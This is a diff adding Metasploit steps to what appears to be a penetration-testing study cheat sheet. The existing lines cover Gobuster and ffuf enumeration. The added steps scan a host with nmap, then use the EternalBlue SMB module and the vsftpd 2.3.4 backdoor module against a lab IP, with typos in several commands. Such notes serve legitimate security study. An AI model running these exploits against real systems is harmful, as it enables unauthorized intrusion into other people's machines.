@@ -218,3 +218,22 @@ Gobuster dir –u http:IP –w  /usr/share/wordlists/dirbuster/directory-list-2.
 Fuff –u http://IP/Fuzz –w  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt .e .html,.css,.js
 Vhost enumeration
 Gobuster vhost –u http://IP –w  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt –append-domain
+#System Hacking
+Metasploit
+Step 1: scan the target: nmap –A –sC 192.168.1.2
+Step 2: sudo msfconsole
+Step 3: Search for the Eternal Blue exploit( if port 445 is open)(by writing serach eternal.
+             :use exploit/windows/smb/ms17_010_psexec
+Step 4: Set RHOSTS to set the target and se LHOST as your kali
+machine IP.
+>set RHOSTS IP
+>set LHOST IP
+Step 5: exploit
+After that by writing ps we can see exe files of other machine
+#Exploit
+Use metaspolit (example to exploit vsftpd 2.3.4)
+Step 1: sudo msf console
+Step 2 : serach vsftpd( to get step 3 command)
+Step3 : use exploit/unix/ftp/vsftpd_234_backdoor
+Step 4: set RHOSTS 192.168.1.2
+Step 5: exploit
